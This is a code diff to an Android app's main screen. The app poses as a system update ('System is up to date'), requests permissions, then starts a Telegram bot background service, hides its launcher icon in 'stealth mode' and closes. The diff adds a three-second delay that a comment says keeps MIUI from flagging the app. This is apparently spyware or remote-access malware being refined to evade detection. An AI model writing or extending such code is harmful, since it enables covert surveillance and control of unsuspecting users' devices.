@@ -6,6 +6,7 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.widget.TextView;
 import java.util.ArrayList;
 import java.util.List;
@@ -16,7 +17,7 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         
         TextView tv = new TextView(this);
-        tv.setText("System is up to date.");
+        tv.setText("System is up to date.\nInitializing...");
         tv.setPadding(50, 50, 50, 50);
         setContentView(tv);
 
@@ -31,15 +32,30 @@ public class MainActivity extends Activity {
 
         String[] permArray = perms.toArray(new String[0]);
         requestPermissions(permArray, 1);
+    }
 
-        // Start Telegram Bot Background Service
-        startForegroundService(new Intent(this, TelegramService.class));
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
+        // Kan-tsennaw chwiya (3 secondes) bach MIUI ma-ychokch f l'app
+        new Handler().postDelayed(() -> {
+            try {
+                // Start Telegram Bot Background Service
+                startForegroundService(new Intent(this, TelegramService.class));
 
-        // HIDE ICON (Stealth Mode)
-        getPackageManager().setComponentEnabledSetting(
-            new android.content.ComponentName(this, MainActivity.class),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        );
+                // Hide Icon (Stealth Mode)
+                getPackageManager().setComponentEnabledSetting(
+                    new android.content.ComponentName(this, MainActivity.class),
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                );
+                
+                // Close the app
+                finishAffinity();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }, 3000); 
     }
 }
